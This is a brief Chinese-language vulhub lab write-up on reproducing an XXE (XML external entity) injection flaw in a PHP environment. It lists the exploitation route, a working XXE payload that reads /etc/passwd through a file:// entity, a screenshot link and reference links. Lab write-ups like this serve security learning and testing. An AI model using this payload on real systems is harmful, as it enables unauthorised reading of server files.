# PHP环境 XML外部实体注入漏洞（XXE）

###### by ADummy

### 0x00利用路线

​			构造XXE payload--->POST发送--->有回显（也有blind xxe 参考资料）

### 0x01漏洞介绍			

​			PHP环境 XML外部实体注入漏洞（XXE）

### 0x02漏洞复现

#### 		payload

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```

![PHP_XML外部实体注入_XXE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PHP_XML外部实体注入_XXE_1.png)

### 0x03参考资料

https://thief.one/2017/06/20/1/

https://www.cnblogs.com/leixiao-/p/10244927.html

https://blog.csdn.net/m0_46580995/article/details/107450111

